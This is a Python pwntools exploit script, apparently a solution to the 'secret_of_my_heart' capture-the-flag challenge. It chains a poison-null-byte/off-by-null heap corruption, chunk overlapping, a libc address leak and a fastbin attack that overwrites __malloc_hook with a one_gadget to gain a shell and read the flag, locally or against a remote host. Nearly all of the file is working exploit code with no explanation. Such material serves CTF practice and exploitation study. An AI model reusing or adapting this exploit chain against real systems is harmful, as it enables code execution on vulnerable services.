#coding:utf-8
from pwn import *
import sys

context.log_level = 'debug'

def add(Size,Name,Secret):
    io.sendlineafter('Your choice :',str(1))
    io.sendlineafter('Size of heart : ',str(Size))
    io.sendafter('Name of heart :',Name)
    io.sendafter('secret of my heart :',Secret)
    io.recvuntil('Done !\n')

def show(Index):
    io.sendlineafter('Your choice :',str(2))
    io.sendlineafter('Index :',str(Index))

def delete(Index):
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(Index))
    io.recvuntil('Done !\n')

def leave():
    io.sendlineafter('Your choice :',str(4))

def Secret():
    io.sendlineafter('Your choice :',str(4869))

def exploit(flag):
    #Poison null byte
    log.info("Posion null byte..")
    gdb.attach(io)
    add(0x28,'0'*0x20,'a'*0x28)
    add(0x100,'1'*0x20,'b'*0xf0+p64(0x100))
    add(0x100,'2'*0x20,'c'*0x100)
    delete(1)
    delete(0)

    log.info("off-by-null")
    add(0x28,'0'*0x20,'d'*0x28)

    log.info("Chunk Overlapping...")
    add(0x80,'1'*0x20,'e'*0x80)
    add(0x10,'3'*0x20,'f'*0x10)
    delete(1)
    delete(2)
    #leaking libc
    add(0x80,'1'*0x20,'g'*0x80)
    add(0x100,'2'*0x20,'h'*0x68+p64(0x1234))
    add(0x80,'4'*0x20,'i'*0x80)
    log.info("note2 and note3 point to the same heap address!")
    delete(2)
    show(3)
    io.recvuntil('Secret : ')
    if flag==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c4b78
        one_gadget = libc.address+0xf02a4
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c3b78
        one_gadget = libc.address+0xef6c4 
    log.info("one_gadget:"+hex(one_gadget))
    __malloc_hook = libc.symbols['__malloc_hook']
    log.info("__malloc_hook:"+hex(__malloc_hook))

    # Fastbin attack through house of spirit
    delete(1)
    payload = 'A'*0x80
    payload += p64(0)+p64(0x71)
    add(0x100,'1'*0x20,payload)
    delete(3)
    delete(1)
    payload1 = 'B'*0x80
    payload1 += p64(0)+p64(0x71)
    payload1 += p64(__malloc_hook-0x23)
    add(0x100,'1'*0x20,payload1)

    add(0x60,'2'*0x20,'fake')
    payload2 = 0x13*"\x00"
    payload2 += p64(one_gadget)
    #gdb.attach(io,"b *"+hex(proc_base+0x11AC))
    add(0x60,'3'*0x20,payload2)
    
    raw_input("GO?")
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(3))
    io.sendline("cat /home/secret_of_my_heart/flag")
    flag = io.recv()
    print flag

    io.interactive()

if __name__ == "__main__":
    context.binary = "./secret_of_my_heart"
    #context.terminal = ['tmux','sp','-h']
    #context.log_level = 'debug'
    #elf = ELF('./libc.so.6')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc=ELF('./libc.so.6')
        exploit(0)
    else:
        io = process('./secret_of_my_heart')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #print io.libs()
        #proc_base = io.libs()['/mnt/hgfs/Binary/CTF/Shooting/pwnable.tw/secret_of_my_heart/workspace/secret_of_my_heart']
        #log.info('proc_base:'+hex(proc_base))
        #libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
        #log.info('libc_base:'+hex(libc_base))
        #io = process('',env={'LD_PRELOAD':''})
        #libc = ELF('')
        exploit(1)

